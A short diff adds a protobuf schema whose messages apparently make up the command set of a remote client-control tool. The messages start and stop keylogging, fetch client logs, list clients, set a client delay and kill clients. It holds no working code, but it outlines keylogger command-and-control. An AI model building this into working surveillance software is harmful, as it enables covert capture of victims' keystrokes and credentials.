@@ -1,0 +1,19 @@
+syntax = "proto3";
+
+message GetClientLog {
+  int32 limit = 1;
+}
+
+message ClientList {}
+
+message ClientStatus {}
+
+message StartKeylogging {}
+
+message StopKeylogging {}
+
+message KillClient {}
+
+message SetClientDelay {
+  int32 delay = 1;
+}
